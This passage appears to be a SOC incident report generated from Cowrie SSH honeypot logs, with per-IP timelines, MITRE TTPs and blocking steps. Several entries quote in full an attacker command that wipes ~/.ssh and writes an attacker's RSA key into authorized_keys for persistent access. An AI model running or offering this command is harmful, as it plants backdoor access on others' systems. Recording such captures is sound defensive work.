| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 07:49:41` | `cowrie.session.connect` |
| `2026-03-16 07:49:41` | `cowrie.client.version` |
| `2026-03-16 07:49:41` | `cowrie.client.kex` |
| `2026-03-16 07:49:42` | `cowrie.login.success` |
| `2026-03-16 07:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42bb9d6b3a74

| Field | Detail |
|---|---|
| **Source IP** | `118.185.85[.]137` |
| **First Seen** | 2026-03-16 09:44 |
| **Last Seen** | 2026-03-16 09:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 09:44:53` | `cowrie.session.connect` |
| `2026-03-16 09:44:54` | `cowrie.client.version` |
| `2026-03-16 09:44:54` | `cowrie.client.kex` |
| `2026-03-16 09:44:59` | `cowrie.login.success` |
| `2026-03-16 09:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.185.85[.]137` to AbuseIPDB if not already reported
- [ ] Block `118.185.85[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e40ed1cd3728

| Field | Detail |
|---|---|
| **Source IP** | `34.93.128[.]179` |
| **First Seen** | 2026-03-16 09:46 |
| **Last Seen** | 2026-03-16 09:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 09:46:12` | `cowrie.session.connect` |
| `2026-03-16 09:46:12` | `cowrie.client.version` |
| `2026-03-16 09:46:12` | `cowrie.client.kex` |
| `2026-03-16 09:46:12` | `cowrie.login.success` |
| `2026-03-16 09:46:12` | `cowrie.session.params` |
| `2026-03-16 09:46:12` | `cowrie.command.input` |
| `2026-03-16 09:46:12` | `cowrie.command.failed` |
| `2026-03-16 09:46:12` | `cowrie.log.closed` |
| `2026-03-16 09:46:12` | `cowrie.session.params` |
| `2026-03-16 09:46:12` | `cowrie.command.input` |
| `2026-03-16 09:46:12` | `cowrie.session.file_download` |
| `2026-03-16 09:46:12` | `cowrie.log.closed` |
| `2026-03-16 09:46:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.93.128[.]179` to AbuseIPDB if not already reported
- [ ] Block `34.93.128[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a741e72582d8

| Field | Detail |
|---|---|
| **Source IP** | `34.93.128[.]179` |
| **First Seen** | 2026-03-16 09:46 |
| **Last Seen** | 2026-03-16 09:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 09:46:13` | `cowrie.session.connect` |
| `2026-03-16 09:46:13` | `cowrie.client.version` |
| `2026-03-16 09:46:13` | `cowrie.client.kex` |
| `2026-03-16 09:46:13` | `cowrie.login.success` |
| `2026-03-16 09:46:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.93.128[.]179` to AbuseIPDB if not already reported
- [ ] Block `34.93.128[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-702dbfe35fc0

| Field | Detail |
|---|---|
| **Source IP** | `34.93.128[.]179` |
| **First Seen** | 2026-03-16 09:48 |
| **Last Seen** | 2026-03-16 09:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 09:48:21` | `cowrie.session.connect` |
| `2026-03-16 09:48:21` | `cowrie.client.version` |
| `2026-03-16 09:48:21` | `cowrie.client.kex` |
| `2026-03-16 09:48:21` | `cowrie.login.success` |
| `2026-03-16 09:48:21` | `cowrie.session.params` |
| `2026-03-16 09:48:21` | `cowrie.command.input` |
| `2026-03-16 09:48:21` | `cowrie.command.failed` |
| `2026-03-16 09:48:21` | `cowrie.log.closed` |
| `2026-03-16 09:48:21` | `cowrie.session.params` |
| `2026-03-16 09:48:21` | `cowrie.command.input` |
| `2026-03-16 09:48:21` | `cowrie.session.file_download` |
| `2026-03-16 09:48:21` | `cowrie.log.closed` |
| `2026-03-16 09:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.93.128[.]179` to AbuseIPDB if not already reported
- [ ] Block `34.93.128[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d87b20c1880

| Field | Detail |
|---|---|
| **Source IP** | `34.93.128[.]179` |
| **First Seen** | 2026-03-16 09:48 |
| **Last Seen** | 2026-03-16 09:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 09:48:22` | `cowrie.session.connect` |
| `2026-03-16 09:48:22` | `cowrie.client.version` |
| `2026-03-16 09:48:22` | `cowrie.client.kex` |
| `2026-03-16 09:48:22` | `cowrie.login.success` |
| `2026-03-16 09:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.93.128[.]179` to AbuseIPDB if not already reported
- [ ] Block `34.93.128[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4627e2df1338

| Field | Detail |
|---|---|
| **Source IP** | `118.194.250[.]47` |
| **First Seen** | 2026-03-16 09:49 |
| **Last Seen** | 2026-03-16 09:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 09:49:31` | `cowrie.session.connect` |
| `2026-03-16 09:49:31` | `cowrie.client.version` |
| `2026-03-16 09:49:31` | `cowrie.client.kex` |
| `2026-03-16 09:49:32` | `cowrie.login.success` |
| `2026-03-16 09:49:32` | `cowrie.session.params` |
| `2026-03-16 09:49:32` | `cowrie.command.input` |
| `2026-03-16 09:49:32` | `cowrie.command.failed` |
| `2026-03-16 09:49:32` | `cowrie.log.closed` |
| `2026-03-16 09:49:32` | `cowrie.session.params` |
| `2026-03-16 09:49:32` | `cowrie.command.input` |
| `2026-03-16 09:49:32` | `cowrie.session.file_download` |
| `2026-03-16 09:49:32` | `cowrie.log.closed` |
| `2026-03-16 09:49:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.250[.]47` to AbuseIPDB if not already reported
- [ ] Block `118.194.250[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f8cdd8b922c

| Field | Detail |
|---|---|
| **Source IP** | `118.194.250[.]47` |
| **First Seen** | 2026-03-16 09:49 |
| **Last Seen** | 2026-03-16 09:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 09:49:34` | `cowrie.session.connect` |
| `2026-03-16 09:49:34` | `cowrie.client.version` |
| `2026-03-16 09:49:34` | `cowrie.client.kex` |
| `2026-03-16 09:49:35` | `cowrie.login.success` |
| `2026-03-16 09:49:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.250[.]47` to AbuseIPDB if not already reported
- [ ] Block `118.194.250[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d6744b4a2ad

| Field | Detail |
|---|---|
| **Source IP** | `118.194.250[.]47` |
| **First Seen** | 2026-03-16 09:53 |
| **Last Seen** | 2026-03-16 09:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 09:53:39` | `cowrie.session.connect` |
| `2026-03-16 09:53:39` | `cowrie.client.version` |
| `2026-03-16 09:53:39` | `cowrie.client.kex` |
| `2026-03-16 09:53:39` | `cowrie.login.success` |
| `2026-03-16 09:53:40` | `cowrie.session.params` |
| `2026-03-16 09:53:40` | `cowrie.command.input` |
| `2026-03-16 09:53:40` | `cowrie.command.failed` |
| `2026-03-16 09:53:40` | `cowrie.log.closed` |
| `2026-03-16 09:53:40` | `cowrie.session.params` |
| `2026-03-16 09:53:40` | `cowrie.command.input` |
| `2026-03-16 09:53:40` | `cowrie.session.file_download` |
| `2026-03-16 09:53:40` | `cowrie.log.closed` |
| `2026-03-16 09:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.250[.]47` to AbuseIPDB if not already reported
- [ ] Block `118.194.250[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a167594e4db2

| Field | Detail |
|---|---|
| **Source IP** | `118.194.250[.]47` |
| **First Seen** | 2026-03-16 09:53 |
| **Last Seen** | 2026-03-16 09:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 09:53:42` | `cowrie.session.connect` |
| `2026-03-16 09:53:42` | `cowrie.client.version` |
| `2026-03-16 09:53:42` | `cowrie.client.kex` |
| `2026-03-16 09:53:42` | `cowrie.login.success` |
| `2026-03-16 09:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.250[.]47` to AbuseIPDB if not already reported
- [ ] Block `118.194.250[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60914a3e28f2

| Field | Detail |
|---|---|
| **Source IP** | `34.93.128[.]179` |
| **First Seen** | 2026-03-16 09:56 |
| **Last Seen** | 2026-03-16 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 09:56:42` | `cowrie.session.connect` |
| `2026-03-16 09:56:42` | `cowrie.client.version` |
| `2026-03-16 09:56:42` | `cowrie.client.kex` |
| `2026-03-16 09:56:42` | `cowrie.login.success` |
| `2026-03-16 09:56:42` | `cowrie.session.params` |
| `2026-03-16 09:56:42` | `cowrie.command.input` |
| `2026-03-16 09:56:42` | `cowrie.command.failed` |
| `2026-03-16 09:56:42` | `cowrie.log.closed` |
| `2026-03-16 09:56:43` | `cowrie.session.params` |
| `2026-03-16 09:56:43` | `cowrie.command.input` |
| `2026-03-16 09:56:43` | `cowrie.session.file_download` |
| `2026-03-16 09:56:43` | `cowrie.log.closed` |
| `2026-03-16 09:56:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.93.128[.]179` to AbuseIPDB if not already reported
- [ ] Block `34.93.128[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a7d0a541451

| Field | Detail |
|---|---|
| **Source IP** | `34.93.128[.]179` |
| **First Seen** | 2026-03-16 09:56 |
| **Last Seen** | 2026-03-16 09:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 09:56:44` | `cowrie.session.connect` |
| `2026-03-16 09:56:44` | `cowrie.client.version` |
| `2026-03-16 09:56:44` | `cowrie.client.kex` |
| `2026-03-16 09:56:44` | `cowrie.login.success` |
| `2026-03-16 09:56:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.93.128[.]179` to AbuseIPDB if not already reported
- [ ] Block `34.93.128[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf37a02ece80

| Field | Detail |
|---|---|
| **Source IP** | `118.194.250[.]47` |
| **First Seen** | 2026-03-16 10:02 |
| **Last Seen** | 2026-03-16 10:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 10:02:17` | `cowrie.session.connect` |
| `2026-03-16 10:02:17` | `cowrie.client.version` |
| `2026-03-16 10:02:17` | `cowrie.client.kex` |
| `2026-03-16 10:02:17` | `cowrie.login.success` |
| `2026-03-16 10:02:18` | `cowrie.session.params` |
| `2026-03-16 10:02:18` | `cowrie.command.input` |
| `2026-03-16 10:02:18` | `cowrie.command.failed` |
| `2026-03-16 10:02:18` | `cowrie.log.closed` |
| `2026-03-16 10:02:18` | `cowrie.session.params` |
| `2026-03-16 10:02:18` | `cowrie.command.input` |
| `2026-03-16 10:02:18` | `cowrie.session.file_download` |
| `2026-03-16 10:02:18` | `cowrie.log.closed` |
| `2026-03-16 10:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.250[.]47` to AbuseIPDB if not already reported
- [ ] Block `118.194.250[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1782b8cb6628

| Field | Detail |
|---|---|
| **Source IP** | `118.194.250[.]47` |
| **First Seen** | 2026-03-16 10:02 |
| **Last Seen** | 2026-03-16 10:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 10:02:20` | `cowrie.session.connect` |
| `2026-03-16 10:02:20` | `cowrie.client.version` |
| `2026-03-16 10:02:20` | `cowrie.client.kex` |
| `2026-03-16 10:02:20` | `cowrie.login.success` |
| `2026-03-16 10:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.250[.]47` to AbuseIPDB if not already reported
- [ ] Block `118.194.250[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1efd04c10a16

| Field | Detail |
|---|---|
| **Source IP** | `14.224.217[.]104` |
| **First Seen** | 2026-03-16 10:53 |
| **Last Seen** | 2026-03-16 10:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 10:53:35` | `cowrie.session.connect` |
| `2026-03-16 10:53:35` | `cowrie.client.version` |
| `2026-03-16 10:53:35` | `cowrie.client.kex` |
| `2026-03-16 10:53:37` | `cowrie.login.success` |
| `2026-03-16 10:53:37` | `cowrie.direct-tcpip.request` |
| `2026-03-16 10:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.224.217[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.224.217[.]104` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7acfa8422d6

| Field | Detail |
|---|---|
| **Source IP** | `143.244.156[.]203` |
| **First Seen** | 2026-03-16 13:26 |
| **Last Seen** | 2026-03-16 13:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 13:26:35` | `cowrie.session.connect` |
| `2026-03-16 13:26:35` | `cowrie.client.version` |
| `2026-03-16 13:26:35` | `cowrie.client.kex` |
| `2026-03-16 13:26:36` | `cowrie.login.success` |
| `2026-03-16 13:26:37` | `cowrie.session.params` |
| `2026-03-16 13:26:37` | `cowrie.command.input` |
| `2026-03-16 13:26:37` | `cowrie.log.closed` |
| `2026-03-16 13:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.244.156[.]203` to AbuseIPDB if not already reported
- [ ] Block `143.244.156[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f84cd87d4baa

| Field | Detail |
|---|---|
| **Source IP** | `143.244.156[.]203` |
| **First Seen** | 2026-03-16 13:26 |
| **Last Seen** | 2026-03-16 13:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 13:26:48` | `cowrie.session.connect` |
| `2026-03-16 13:26:49` | `cowrie.client.version` |
| `2026-03-16 13:26:49` | `cowrie.client.kex` |
| `2026-03-16 13:26:49` | `cowrie.login.success` |
| `2026-03-16 13:26:50` | `cowrie.session.params` |
| `2026-03-16 13:26:50` | `cowrie.command.input` |
| `2026-03-16 13:26:50` | `cowrie.log.closed` |
| `2026-03-16 13:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.244.156[.]203` to AbuseIPDB if not already reported
- [ ] Block `143.244.156[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c06795a183cb

| Field | Detail |
|---|---|
| **Source IP** | `143.244.156[.]203` |
| **First Seen** | 2026-03-16 13:27 |
| **Last Seen** | 2026-03-16 13:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 13:27:02` | `cowrie.session.connect` |
| `2026-03-16 13:27:02` | `cowrie.client.version` |
| `2026-03-16 13:27:02` | `cowrie.client.kex` |
| `2026-03-16 13:27:03` | `cowrie.login.success` |
| `2026-03-16 13:27:03` | `cowrie.session.params` |
| `2026-03-16 13:27:03` | `cowrie.command.input` |
| `2026-03-16 13:27:03` | `cowrie.log.closed` |
| `2026-03-16 13:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.244.156[.]203` to AbuseIPDB if not already reported
- [ ] Block `143.244.156[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77481ad6fdf2

| Field | Detail |
|---|---|
| **Source IP** | `143.244.156[.]203` |
| **First Seen** | 2026-03-16 13:28 |
| **Last Seen** | 2026-03-16 13:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 13:28:41` | `cowrie.session.connect` |
| `2026-03-16 13:28:41` | `cowrie.client.version` |
| `2026-03-16 13:28:41` | `cowrie.client.kex` |
| `2026-03-16 13:28:41` | `cowrie.login.success` |
| `2026-03-16 13:28:42` | `cowrie.session.params` |
| `2026-03-16 13:28:42` | `cowrie.command.input` |
| `2026-03-16 13:28:42` | `cowrie.log.closed` |
| `2026-03-16 13:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.244.156[.]203` to AbuseIPDB if not already reported
- [ ] Block `143.244.156[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-140ad6951d22

| Field | Detail |
|---|---|
| **Source IP** | `143.244.156[.]203` |
| **First Seen** | 2026-03-16 13:29 |
| **Last Seen** | 2026-03-16 13:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 13:29:46` | `cowrie.session.connect` |
| `2026-03-16 13:29:46` | `cowrie.client.version` |
| `2026-03-16 13:29:46` | `cowrie.client.kex` |
| `2026-03-16 13:29:47` | `cowrie.login.success` |
| `2026-03-16 13:29:47` | `cowrie.session.params` |
| `2026-03-16 13:29:47` | `cowrie.command.input` |
| `2026-03-16 13:29:47` | `cowrie.log.closed` |
| `2026-03-16 13:29:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.244.156[.]203` to AbuseIPDB if not already reported
- [ ] Block `143.244.156[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2153b4936a42

| Field | Detail |
|---|---|
| **Source IP** | `143.244.156[.]203` |
| **First Seen** | 2026-03-16 13:29 |
